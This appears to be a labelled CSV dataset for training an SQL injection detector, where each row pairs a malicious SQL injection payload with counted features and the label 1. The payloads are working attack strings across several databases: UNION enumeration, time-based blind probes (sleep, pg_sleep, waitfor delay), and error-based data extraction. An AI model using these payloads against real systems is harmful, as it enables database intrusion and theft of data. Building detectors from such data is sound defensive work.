Query,Singlequotes,Doublequotes,Punctuations,1-linecmt,Mulline-cmt,Spaces,Safekywrd,Harmflkywrd,Percentages,Log_oprtr,Operator,Nulls,Hex-dec,Db_info,Roles,Ntwr_cmds,Lang_cmds,Alphabets,Digits,Spl_char,Label
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',3,0,6,1,0,16,3,0,0,2,8,0,0,0,1,0,1,26,4,5,1
"-4686""  )   as dxks where 7123  =  7123 or elt  (  1032  =  1032,3623  )  --",0,1,8,0,0,16,1,1,0,1,6,0,0,0,0,0,0,16,24,1,1
"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",1,0,11,0,0,6,4,0,1,1,5,0,0,0,0,0,1,14,32,1,1
1'  )   where 8142  =  8142 waitfor delay '0:0:5'--,3,0,8,0,0,9,1,1,0,1,4,0,0,0,0,1,0,17,12,3,1
"1'+  (  select 'nzgq' where 7230  =  7230 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",4,0,11,0,0,20,2,1,0,2,6,0,0,0,0,1,1,26,18,4,1
1'  )   as wjty where 2971  =  2971,1,0,2,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",0,3,8,0,0,12,2,1,0,2,3,0,0,0,0,1,1,22,1,3,1
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",3,0,10,1,0,20,4,1,0,0,5,0,0,0,1,0,2,40,4,3,1
"-4605""  )   union all select 8542,8542,8542,8542,8542,8542,8542,8542--",0,1,12,0,0,6,4,0,0,1,4,0,0,0,0,0,1,14,36,1,1
1 where 8102  =  8102 and 9198  =  9198--,0,0,2,0,0,9,1,0,0,2,6,0,0,0,0,0,0,8,17,0,1
select   (  case when   (  3365  =  6236  )   then 3365 else 1/  (  select 0  )   end  )  --,0,0,8,0,0,20,2,1,0,0,4,0,0,0,0,0,2,31,14,0,1
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",0,4,14,0,0,23,5,1,0,4,5,0,0,0,0,1,2,45,2,4,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,0,3,22,0,0,34,3,4,1,4,10,2,0,0,0,0,1,60,16,3,1
"1""  )   where 3122  =  3122 and sleep  (  5  )  #",0,1,4,0,0,12,1,1,0,2,3,0,0,0,0,1,0,13,10,1,1
"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",0,1,11,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,44,1,1
-9456%'   )    )     )   order by 1#,1,0,5,0,0,7,2,0,1,1,3,0,0,0,0,0,0,7,5,1,1
-9668'   )    )    as orfu where 5822  =  5822 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,0,40,0,0,81,4,14,0,3,18,0,0,0,0,0,1,88,58,1,1
-2207%'  )   or   (  8459  =  8459  )  *4906 and   (  '%'  =  ',4,0,9,0,0,14,2,0,2,3,9,0,0,0,0,0,0,5,16,4,1
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",4,0,30,0,0,60,17,1,0,7,12,0,2,0,0,0,6,110,55,4,1
"1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",3,0,13,0,0,31,3,4,0,1,8,0,0,0,0,0,2,94,17,3,1
"1"" where 6800  =  6800 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,1,17,0,0,27,0,1,0,0,1,0,2,0,0,0,0,55,31,1,1
"1  )   where 6340  =  6340 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",0,0,21,0,0,37,4,1,0,2,7,0,3,0,0,0,3,49,40,0,1
 or ''^',3,0,3,0,0,2,1,0,0,1,2,0,0,0,0,0,0,2,0,3,1
"1%"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""%""  =  """,0,4,16,0,0,28,2,0,2,3,13,0,0,0,0,0,0,39,16,4,1
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'efpc' like 'efpc",4,0,30,0,0,54,7,7,0,6,13,1,0,0,1,0,1,122,34,4,1
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1,0,5,0,0,13,2,1,0,2,3,0,0,0,0,1,1,20,10,1,1
"1""   )    )     )   union all select null--",0,1,6,0,0,8,4,0,0,1,3,1,0,0,0,0,1,18,1,1,1
"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,0,16,0,0,26,1,0,1,2,12,0,0,0,0,0,0,37,15,1,1
"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",1,0,7,0,0,13,1,0,0,1,6,0,0,0,0,0,0,10,24,1,1
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'pydi' like 'pydi",4,0,43,0,0,83,6,14,0,6,18,0,0,0,0,0,2,107,47,4,1
-5039 union all select 2114#,0,0,1,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,8,0,1
"1%""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,2,4,17,0,0,23,4,1,2,6,11,0,0,0,0,0,0,34,15,6,1
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,0,0,9,0,0,18,3,1,0,1,2,0,0,0,0,1,2,30,2,0,1
"1%'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",4,0,19,0,0,29,7,3,2,7,12,0,0,0,0,0,1,67,8,4,1
"-2734'  )   union all select 5510,5510,5510,5510,5510#",1,0,7,0,0,6,4,0,0,1,2,0,0,0,0,0,1,14,24,1,1
"1""   )    )    as eagr where 3366  =  3366 and elt  (  4249  =  4249,7259  )  --",0,1,8,0,0,17,1,1,0,2,6,0,0,0,0,0,0,17,21,1,1
"1%'   )    )     )   union all select null,null,null,null--",1,0,9,0,0,8,4,0,1,1,4,4,0,0,0,0,1,30,1,1,1
"1  )   where 9829  =  9829 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,29,0,0,53,2,7,0,2,16,2,0,0,0,0,0,76,33,0,1
"-6363""  )   where 4043  =  4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",0,1,13,0,0,10,4,0,0,1,5,0,0,0,0,0,1,19,48,1,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",0,0,8,1,0,13,6,0,0,5,8,0,0,0,5,0,1,64,5,0,1
1'  )   as xqbq where 1619  =  1619 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,5,0,12,0,0,30,3,3,0,2,10,0,0,0,0,0,1,64,23,5,1
"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",4,0,12,0,0,16,5,0,0,4,6,0,0,0,0,0,0,24,16,4,1
"1"" and make_set  (  8403  =  8403,8899  )  ",0,1,4,0,0,8,3,0,0,2,3,0,0,0,0,0,0,10,13,1,1
-1730' or 8571  =  8571--,1,0,4,0,0,5,1,0,0,1,5,0,0,0,0,0,0,2,12,1,1
"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""ymhg""  =  ""ymhg",0,4,36,0,0,66,17,1,0,6,11,0,2,0,0,0,6,109,55,4,1
"1""  )   where 9359  =  9359 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,1,11,0,0,27,2,4,0,1,6,0,0,0,0,0,1,76,17,1,1
-6548 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- rlda,0,0,34,1,0,71,2,2,0,1,26,0,0,0,0,0,1,94,48,0,1
"1""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""vurb"" like ""vurb",0,4,37,0,0,75,4,2,0,5,27,0,0,0,0,0,1,106,45,4,1
"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '%'  =  '",4,0,21,0,0,35,2,2,2,2,6,0,3,0,0,0,1,69,37,4,1
union select * from users where login   =   char ...,0,0,4,0,0,10,4,1,0,1,3,0,0,0,1,0,1,34,0,0,1
1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,0,0,9,0,0,27,2,2,0,1,5,0,1,0,0,0,1,42,21,0,1
"-9845""  )   as xpis where 1936  =  1936 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",0,1,20,0,0,47,8,3,0,6,10,0,2,0,0,0,1,74,45,1,1
"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,13,0,0,21,7,0,0,7,11,0,0,0,5,0,1,63,10,1,1
"-3321"" where 1603  =  1603 union all select 1603,1603,1603,1603#",0,1,5,0,0,9,4,0,0,1,3,0,0,0,0,0,1,19,28,1,1
-8513  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  5818  =  5818,0,0,32,0,0,73,4,1,0,4,28,0,0,0,0,0,1,91,56,0,1
"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'bzak' like 'bzak",4,0,15,0,0,24,4,0,0,5,7,0,0,0,0,0,1,47,13,4,1
"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",0,1,7,0,0,16,3,1,0,2,6,0,0,0,0,0,0,21,21,1,1
"1""  )   where 3679  =  3679",0,1,2,0,0,6,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"-9531'   )    )     )   union all select 4076,4076#",1,0,6,0,0,8,4,0,0,1,2,0,0,0,0,0,1,14,12,1,1
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,0,11,0,0,20,3,1,0,2,3,0,0,0,0,1,2,28,2,1,1
"1""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",0,1,10,0,0,25,3,2,0,1,3,0,0,0,0,1,2,41,10,1,1
"1""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""dtfg""  =  ""dtfg",0,4,32,0,0,52,13,2,0,9,13,0,2,0,0,0,3,108,35,4,1
"1'  )   where 4786  =  4786 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,0,28,0,0,45,5,1,0,1,7,0,3,0,0,0,4,53,79,1,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'frpo' like 'frpo",3,0,16,0,0,23,4,2,0,5,5,1,0,0,0,0,1,53,14,3,1
"1""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,1,13,0,0,20,2,0,0,2,6,0,0,0,0,0,1,32,13,1,1
"1'  )   where 6081  =  6081 union all select null,null,null,null,null,null,null,null,null--",1,0,12,0,0,10,4,0,0,1,4,9,0,0,0,0,1,55,9,1,1
"-9011""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",0,1,21,0,0,42,8,2,0,6,9,0,2,0,0,0,1,63,37,1,1
"1""   )    )    as sqzh where 5672  =  5672 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",0,1,13,0,0,27,7,1,0,7,12,0,0,0,5,0,1,74,18,1,1
1'||  (  select 'vpuh' where 8164  =  8164,3,0,4,0,0,8,1,0,0,0,3,0,0,0,0,0,1,15,9,3,1
1%'  )   and 9226  =  7542--,1,0,4,0,0,6,1,0,1,2,6,0,0,0,0,0,0,3,9,1,1
"1""  )   and make_set  (  4539  =  6401,6401  )   and   (  ""kglx""  =  ""kglx",0,4,9,0,0,14,4,0,0,4,6,0,0,0,0,0,0,21,13,4,1
"-7806""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""vlrj"" like ""vlrj",0,4,11,0,0,16,3,0,0,4,7,0,0,0,0,0,0,17,16,4,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",3,0,15,0,0,22,3,2,1,4,6,1,0,0,0,0,1,41,14,3,1
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  -- bqxe",0,0,21,1,0,37,2,5,0,3,12,1,0,0,0,0,0,57,27,0,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%""  =  """,0,3,9,0,0,16,7,0,1,7,10,0,0,0,5,0,1,63,5,3,1
1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,4,0,14,0,0,27,3,1,0,3,5,0,1,0,0,0,1,42,13,4,1
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""djrh""  =  ""djrh",0,4,39,0,0,77,4,1,0,5,28,0,0,0,0,0,1,100,45,4,1
"1""   )    )    as xtlt where 9293  =  9293",0,1,3,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
" end and    (    (     (  ""memh"" like ""memh",0,3,6,0,0,8,2,0,0,3,3,0,0,0,0,0,0,18,0,3,1
1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,4,0,10,0,0,14,2,1,0,3,4,0,0,0,0,1,0,21,2,4,1
select   (  case when   (  8208  =  7960  )   then 8208 else 8208*  (  select 8208 from information_schema.character_sets  )   end  )  #,0,0,7,0,0,22,7,2,0,2,4,0,0,0,0,0,2,65,20,0,1
" select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",3,0,8,1,0,18,4,1,0,0,5,0,0,0,1,0,2,40,4,3,1
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",3,0,6,1,0,20,4,1,0,0,7,0,0,0,1,0,2,62,5,3,1
"1""   )    )     )   union all select null#",0,1,4,0,0,8,4,0,0,1,1,1,0,0,0,0,1,18,1,1,1
"1""  )   where 1793  =  1793",0,1,2,0,0,6,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )   ",0,1,6,0,0,11,1,1,0,2,3,0,0,0,0,1,0,11,10,1,1
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",0,2,5,1,0,16,3,0,0,2,7,0,0,0,1,0,1,26,4,2,1
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'vnfi'  =  'vnfi,4,0,35,0,0,73,4,1,0,5,28,0,0,0,0,0,1,100,45,4,1
-8051  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  5637  =  5637,4,0,11,0,0,28,4,2,0,3,10,0,0,0,0,0,1,55,26,4,1
"-9062"" or 6872  =  6872 and ""aumq"" like ""aumq",0,4,5,0,0,9,3,0,0,4,6,0,0,0,0,0,0,17,12,4,1
"1""   )    )     )   and 7153  =  7474--",0,1,6,0,0,8,1,0,0,2,5,0,0,0,0,0,0,3,9,1,1
"1"" where 5796  =  5796 and sleep  (  5  )  #",0,1,3,0,0,11,1,1,0,2,3,0,0,0,0,1,0,13,10,1,1
tz_offset,0,0,0,0,0,1,2,0,0,0,0,0,0,0,0,0,0,8,0,0,1
"-3215""  )   union all select 4457,4457,4457,4457,4457#",0,1,7,0,0,6,4,0,0,1,2,0,0,0,0,0,1,14,24,1,1
""" or 0  =  0 --",0,1,3,0,0,6,1,0,0,1,4,0,0,0,0,0,0,2,2,1,1
"-2226%""   )    )    union all select 1018,1018,1018,1018--",0,1,9,0,0,7,4,0,1,1,5,0,0,0,0,0,1,14,20,1,1
"1""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""xsfg"" like ""xsfg",4,4,14,0,0,28,5,2,0,5,10,0,0,0,0,0,1,68,15,8,1
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,0,0,2,1,0,16,2,0,1,1,7,0,0,0,1,0,1,24,5,0,1
"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",0,1,10,0,0,19,3,1,1,2,4,0,0,0,0,1,2,28,2,1,1
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'xazf'  =  'xazf,4,0,40,0,0,78,3,3,0,4,27,0,0,0,0,0,1,86,45,4,1
"1%""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """,0,4,12,0,0,21,3,1,2,4,8,0,0,0,0,1,1,23,10,4,1
1'||  (  select 'puco' where 2605  =  2605 union all select null#,3,0,4,0,0,12,5,0,0,1,4,1,0,0,0,0,2,33,9,3,1
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",0,0,6,1,0,15,4,1,0,0,5,0,0,0,1,0,2,40,3,0,1
"-5148""   )    )    or 5310  =  8229",0,1,4,0,0,7,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
"1""  )   as vcvw where 2445  =  2445 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",0,1,8,0,0,21,2,2,0,2,6,0,0,0,0,1,1,31,18,1,1
1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,3,0,6,0,0,14,2,1,0,2,4,0,0,0,0,1,1,23,10,3,1
1'   )    )    as uizu where 1774  =  1774,1,0,3,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
" select * from users where id  =  1 or   (  \+  )    =  1 union select 1,@@VERSION -- 1",0,0,5,1,0,19,5,1,0,1,7,0,0,1,1,0,2,42,4,1,1
1'   )    )    as pdcl where 6964  =  6964,1,0,3,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null--",1,0,13,0,0,7,4,0,1,1,4,9,0,0,0,0,1,50,1,1,1
"1'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,16,0,0,31,2,7,0,2,6,0,0,0,7,0,1,109,12,1,1
1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'vhqm'  =  'vhqm,8,0,14,0,0,28,4,2,0,4,10,0,0,0,0,0,1,64,15,8,1
-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,1,0,6,0,0,12,1,0,0,1,7,0,0,0,0,0,0,7,24,1,1
"-3749"" or elt  (  1032  =  1032,3623  )   and ""mzrw""  =  ""mzrw",0,4,8,0,0,12,2,0,0,3,6,0,0,0,0,0,0,16,16,4,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",3,0,15,0,0,35,8,1,0,8,11,0,0,0,0,0,2,123,2,3,1
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'yqzg'  =  'yqzg",4,0,15,0,0,25,3,3,0,4,7,0,0,0,0,0,1,83,8,4,1
"1'||  (  select 'ejuu' from dual where 2903  =  2903 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",4,0,15,0,0,30,3,3,0,2,9,0,0,0,0,0,2,95,16,4,1
"-9265""  )   or 7834  =  1685",0,1,3,0,0,6,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
"1""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""qqky"" like ""qqky",0,4,20,0,0,32,3,0,0,5,12,0,0,0,0,0,0,52,16,4,1
1%'  )   and 2949  =  4847 and   (  '%'  =  ',4,0,6,0,0,11,2,0,2,4,8,0,0,0,0,0,0,6,9,4,1
"1%""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """,0,4,30,0,0,45,6,1,2,4,10,0,3,0,0,0,4,52,71,4,1
"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",1,0,9,0,0,9,4,0,0,1,4,7,0,0,0,0,1,47,9,1,1
"-9507%"" union all select 3342,3342,3342,3342,3342#",0,1,6,0,0,5,4,0,1,1,3,0,0,0,0,0,1,14,24,1,1
"-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",1,0,13,0,0,6,4,0,0,1,4,0,0,0,0,0,1,14,40,1,1
"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",0,4,14,0,0,23,4,1,0,5,6,0,0,0,0,1,1,35,10,4,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec",5,0,15,0,0,19,6,1,0,7,9,0,0,0,0,0,1,46,10,5,1
1'+  (  select 'rpds' where 5870  =  5870 and 4595  =  4595#,3,0,4,0,0,12,2,0,0,2,5,0,0,0,0,0,1,18,17,3,1
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'rupq'  =  'rupq",4,0,16,0,0,28,2,0,0,4,12,0,0,0,0,0,0,48,16,4,1
1' where 9583  =  9583 and 5319  =  7670#,1,0,1,0,0,9,1,0,0,2,4,0,0,0,0,0,0,8,17,1,1
1   )    )    as ctqr where 2609  =  2609,0,0,2,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,0,1
"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,0,30,0,0,62,16,1,0,4,11,0,2,0,0,0,6,103,63,1,1
"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,0,4,20,0,0,26,4,1,2,3,7,0,3,0,0,0,2,36,39,4,1
"1%""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,2,4,21,0,0,27,4,1,2,7,12,0,0,0,0,0,0,35,15,6,1
